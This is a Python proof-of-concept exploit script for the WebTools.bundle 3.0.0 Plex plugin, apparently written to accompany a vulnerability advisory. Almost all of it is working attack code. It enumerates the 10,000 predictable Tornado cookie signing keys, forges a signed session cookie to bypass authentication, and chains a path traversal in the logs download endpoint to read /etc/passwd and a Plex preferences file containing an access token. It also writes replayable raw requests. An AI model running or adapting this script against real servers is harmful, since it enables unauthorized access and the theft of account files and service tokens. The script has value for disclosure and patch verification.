#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webtools_cookie_forge.py
================================================================================
WebTools.bundle 3.0.0 - predictable Tornado session signing key
-> offline forging of a signed session cookie -> authentication bypass.

(Advisory: ../1.md)

How it works
------------
1) WebTools uses Tornado secure cookies. The signing key is derived from
   predictable values:
       SharedSecret  = VERSION + "." + randint(0, 9999)   # VERSION is still "ERROR"
       cookie_secret = "__" + md5(SharedSecret + NAME) + "__"   # NAME = "WebTools"
   => only 10000 possible keys: "__md5('ERROR.<0..9999>WebTools')__"
2) Tornado (1.x) signed cookie format:
       Cookie: <NAME>=<base64(value)>|<timestamp>|<signature>
       signature = HMAC-SHA1(cookie_secret, NAME + base64(value) + str(timestamp))
   The server validates the signature only, not the cookie content.
3) Enumerate 0..9999, build the cookie, and request /api/v3/logs/list:
       302 -> wrong signature; 200 -> valid session (key recovered).
4) With the recovered cookie, call the logs download endpoint to read
   arbitrary files (path traversal, see ../2.md).

Usage
-----
    python webtools_cookie_forge.py                          # default target, full run
    python webtools_cookie_forge.py --base http://TARGET:33400
    python webtools_cookie_forge.py --i 1234                 # verify a single candidate
    python webtools_cookie_forge.py --threads 20 --no-chain
    python webtools_cookie_forge.py --outdir ./out

Requirements: pip install requests
Scope: read-only probing (GET); stops on the first hit; no destructive actions.
Output (next to this script):
    webtools_cookie_forge_result.json   recovered secret / cookie / evidence
    webtools_cookie_forge_packets.md    raw HTTP requests (Yakit-ready)
    webtools_cookie_forge_log.txt       run log
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

DEFAULT_BASE = "http://127.0.0.1:33400"
UA = "Mozilla/5.0"
TIMEOUT = 10

# Source-code constants (ukdtom/WebTools.bundle 3.0.0: webSrv.py / consts.py)
VERSION_PLACEHOLDER = "ERROR"   # placeholder VERSION before setConsts() runs
NAME_CANDIDATES = ["WebTools", "WebTools.bundle"]  # plugin (bundle) directory name
# Optional known candidates for a fast check; leave empty for a full 0..9999 scan.
KNOWN_I = []

STATE = {"base": DEFAULT_BASE, "outdir": os.path.dirname(os.path.abspath(__file__)),
         "log": None, "packets": []}


def log(msg=""):
    line = str(msg)
    print(line, flush=True)
    if STATE["log"]:
        try:
            STATE["log"].write(line + "\n")
            STATE["log"].flush()
        except Exception:
            pass


def banner(t):
    log("\n" + "=" * 78)
    log(t)
    log("=" * 78)


def netloc():
    return re.sub(r"^https?://", "", STATE["base"]).rstrip("/")


def build_raw(method, path, headers=None):
    h = {"Host": netloc(), "User-Agent": UA, "Connection": "close"}
    if headers:
        h.update(headers)
    lines = [f"{method} {path} HTTP/1.1"] + [f"{k}: {v}" for k, v in h.items()] + [""]
    return "\r\n".join(lines)


def add_packet(title, raw):
    STATE["packets"].append((title, raw))


def http(method, path, headers=None, timeout=TIMEOUT, allow_redirects=False, tag=""):
    url = path if path.startswith("http") else STATE["base"] + path
    h = {"User-Agent": UA, "Connection": "close"}
    if headers:
        h.update(headers)
    try:
        r = requests.request(method, url, headers=h, timeout=timeout,
                             verify=False, allow_redirects=allow_redirects)
        if tag:
            log(f"[{tag}] {method} {path} -> HTTP {r.status_code} "
                f"(Location={r.headers.get('Location')}) len={len(r.content)}")
        return r
    except Exception as e:
        if tag:
            log(f"[{tag}] {method} {path} !!! {type(e).__name__}: {e}")
        return None


# ------------------------------------------------------------------ forging
def candidate_secret(i, name=NAME_CANDIDATES[0], prefix=VERSION_PLACEHOLDER):
    """cookie_secret = '__' + md5(prefix + '.' + i + name) + '__'"""
    shared = f"{prefix}.{i}"
    return "__" + hashlib.md5((shared + name).encode()).hexdigest() + "__"


def sign_v1(secret, name, value, ts):
    """Tornado 1.x _create_signature_v1: HMAC-SHA1(secret, name + value + str(ts))"""
    msg = name + value + str(ts)
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha1).hexdigest()


def build_cookie(secret, name="WebTools", raw_value=b"1", ts=None):
    ts = int(ts if ts is not None else time.time())
    value_b64 = base64.b64encode(raw_value).decode()          # b"1" -> "MQ=="
    sig = sign_v1(secret, name, value_b64, ts)
    cookie = f"{name}={value_b64}|{ts}|{sig}"
    return cookie, sig, ts, value_b64


def probe_cookie(cookie, path="/api/v3/logs/list", session=None):
    """302/401 -> wrong signature; 200 -> valid session."""
    try:
        s = session or requests
        r = s.get(STATE["base"] + path,
                  headers={"User-Agent": UA, "Cookie": cookie, "Connection": "close"},
                  timeout=TIMEOUT, verify=False, allow_redirects=False)
        return r.status_code, r
    except Exception:
        return None, None


# ------------------------------------------------------------------ checks
def step0_fingerprint():
    banner("[0] Fingerprint: confirm WebTools and version")
    r = http("GET", "/version", tag="F0")
    ver = None
    if r is not None and r.status_code == 200:
        try:
            j = r.json()
            ver = j.get("version") if isinstance(j, dict) else None
        except Exception:
            m = re.search(r"(\d+\.\d+\.\d+)", r.text or "")
            ver = m.group(1) if m else None
    log(f"[0] Server={r.headers.get('Server') if r is not None else None} version={ver}")
    r2 = http("GET", "/", tag="F0")
    loc = r2.headers.get("Location") if r2 is not None else None
    log(f"[0] GET / -> {r2.status_code if r2 else None} Location={loc} (should be 302 /login)")
    add_packet("Fingerprint /version", build_raw("GET", "/version"))
    return ver


def brute_secret(threads, try_known=True, limit=10000, delay=0.0):
    """Enumerate candidate cookie_secret values; return on first hit."""
    banner("[1] Enumerate cookie_secret and forge the session cookie")
    log(f"[1] Candidate space: {len(NAME_CANDIDATES)} x {limit}; threads={threads}")

    # 1) optional fast path: known candidates
    quick = []
    if try_known:
        for name in NAME_CANDIDATES:
            for i in KNOWN_I:
                quick.append((i, name))
    for (i, name) in quick:
        secret = candidate_secret(i, name)
        cookie, sig, ts, vb = build_cookie(secret)
        st, _ = probe_cookie(cookie)
        log(f"[1][quick] i={i} name={name} secret={secret} -> HTTP {st}")
        if st == 200:
            log(f"[1] *** HIT (known candidate): i={i} secret={secret} ***")
            return i, name, secret, cookie, sig, ts, vb

    # 2) full concurrent enumeration
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=threads,
                                            pool_maxsize=threads, max_retries=0)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    hit = {"done": False, "res": None}

    def worker(i, name):
        if hit["done"]:
            return None
        secret = candidate_secret(i, name)
        cookie, sig, ts, vb = build_cookie(secret)
        st, _ = probe_cookie(cookie, session=s)
        if delay:
            time.sleep(delay)
        if st == 200:
            return (i, name, secret, cookie, sig, ts, vb)
        return None

    tasks = [(i, name) for name in NAME_CANDIDATES for i in range(limit)]
    done = 0
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(worker, i, n): (i, n) for (i, n) in tasks}
        for f in as_completed(futs):
            done += 1
            res = f.result()
            if res:
                hit["done"] = True
                hit["res"] = res
                for ff in futs:
                    ff.cancel()
                break
            if done % 500 == 0:
                log(f"[1] tried {done}/{len(tasks)} ...")
    if hit["res"]:
        i, name, secret, cookie, sig, ts, vb = hit["res"]
        log(f"[1] *** HIT: i={i} name={name} secret={secret} ***")
        return hit["res"]
    log("[1] no hit in 10000 candidates -> target may be patched or version != 3.0.0")
    return None


def step2_confirm(cookie, name):
    banner("[2] Confirm the forged cookie grants a session (contrast: no cookie)")
    r_ok = http("GET", "/api/v3/logs/list", headers={"Cookie": cookie}, tag="H2")
    r_no = http("GET", "/api/v3/logs/list", tag="H2")
    add_packet("Forged cookie -> logs list (200 = authenticated)",
               build_raw("GET", "/api/v3/logs/list", {"Cookie": cookie}))
    add_packet("Contrast: no cookie (302 = unauthenticated)",
               build_raw("GET", "/api/v3/logs/list"))
    ok = r_ok is not None and r_ok.status_code == 200
    no = r_no is not None and r_no.status_code in (301, 302)
    log(f"[2] with cookie={r_ok.status_code if r_ok else None} "
        f"without cookie={r_no.status_code if r_no else None} "
        f"-> {'bypass confirmed' if (ok and no) else 'contrast not confirmed, review manually'}")
    for p in ("/api/v3/settings/getsettings", "/api/v3/techinfo/getinfo"):
        rr = http("GET", p, headers={"Cookie": cookie}, tag="H2")
        if rr is not None and rr.status_code == 200:
            add_packet(f"Forged cookie -> {p}", build_raw("GET", p, {"Cookie": cookie}))
    return ok


def step3_chain(cookie):
    banner("[3] Downstream: forged cookie + logs download path traversal -> arbitrary file read")
    targets = [
        ("/%2Fetc%2Fpasswd", "system account file"),
        ("/%2Fconfig%2FLibrary%2FApplication%20Support%2FPlex%20Media%20Server%2FPreferences.xml",
         "Plex Preferences.xml (contains PlexOnlineToken)"),
    ]
    hits = []
    for path, desc in targets:
        full = "/api/v3/logs/download" + path
        r = http("GET", full, headers={"Cookie": cookie}, tag="H3")
        if r is not None and r.status_code == 200 and r.content:
            body = r.text[:200].replace("\n", " ")
            log(f"[3] *** HIT: {desc} -> HTTP 200, {len(r.content)} bytes | {body}")
            add_packet(f"Path traversal read: {desc}", build_raw("GET", full, {"Cookie": cookie}))
            hits.append({"path": full, "desc": desc, "bytes": len(r.content),
                         "sample": r.text[:300]})
        else:
            log(f"[3] {desc}: HTTP {r.status_code if r else None}")
    return hits


# ------------------------------------------------------------------ output
def write_outputs(result):
    out = STATE["outdir"]
    jpath = os.path.join(out, "webtools_cookie_forge_result.json")
    with open(jpath, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    ppath = os.path.join(out, "webtools_cookie_forge_packets.md")
    with open(ppath, "w", encoding="utf-8") as f:
        f.write("# WebTools session-key forge PoC - Yakit-ready raw requests\n\n")
        f.write(f"- Target: {STATE['base']}\n- Time: {datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write("- Usage: copy a block into Yakit Repeater (Raw) and send\n\n")
        if result.get("secret"):
            f.write(f"- recovered secret: `{result['secret']}` "
                    f"(i={result.get('i')}, name={result.get('name')})\n\n")
        for title, raw in STATE["packets"]:
            f.write(f"## {title}\n\n```http\n{raw}\n```\n\n")
    return jpath, ppath


def main():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=DEFAULT_BASE)
    ap.add_argument("--outdir", default=None)
    ap.add_argument("--threads", type=int, default=10)
    ap.add_argument("--i", type=int, default=None, help="verify a single candidate index")
    ap.add_argument("--secret", default=None, help="provide a known cookie_secret")
    ap.add_argument("--no-chain", action="store_true", help="skip the downstream file read")
    ap.add_argument("--no-quick", action="store_true", help="skip known candidates")
    args = ap.parse_args()

    STATE["base"] = args.base.rstrip("/")
    if args.outdir:
        STATE["outdir"] = args.outdir
    os.makedirs(STATE["outdir"], exist_ok=True)
    STATE["log"] = open(os.path.join(STATE["outdir"], "webtools_cookie_forge_log.txt"),
                        "w", encoding="utf-8", errors="replace")

    log(f"# target : {STATE['base']}")
    log(f"# output : {STATE['outdir']}")
    log(f"# time   : {datetime.now():%Y-%m-%d %H:%M:%S}")
    log("# note   : read-only probing, stops on first hit")

    ver = step0_fingerprint()

    found = None
    if args.secret:
        cookie, sig, ts, vb = build_cookie(args.secret)
        st, _ = probe_cookie(cookie)
        log(f"[1] provided secret -> HTTP {st}")
        if st == 200:
            found = (None, args.secret, args.secret, cookie, sig, ts, vb)
    elif args.i is not None:
        secret = candidate_secret(args.i)
        cookie, sig, ts, vb = build_cookie(secret)
        st, _ = probe_cookie(cookie)
        log(f"[1] --i {args.i} secret={secret} -> HTTP {st}")
        if st == 200:
            found = (args.i, NAME_CANDIDATES[0], secret, cookie, sig, ts, vb)
    else:
        found = brute_secret(args.threads, try_known=not args.no_quick)

    result = {"target": STATE["base"], "version": ver, "time": datetime.now().isoformat(),
              "vulnerable": bool(found)}
    if found:
        i, name, secret, cookie, sig, ts, vb = found
        result.update({"i": i, "name": name, "secret": secret, "cookie": cookie,
                       "signature": sig, "timestamp": ts, "value_b64": vb})
        step2_confirm(cookie, name)
        if not args.no_chain:
            result["chain"] = step3_chain(cookie)
    else:
        log("\n[!] no valid key found: target may be patched, wrong version, or unreachable")

    jpath, ppath = write_outputs(result)
    log("\n" + "=" * 78)
    log(f"# done: vulnerable={result['vulnerable']}")
    log(f"#   {jpath}")
    log(f"#   {ppath}")
    log("=" * 78)
    if STATE["log"]:
        STATE["log"].close()


if __name__ == "__main__":
    main()
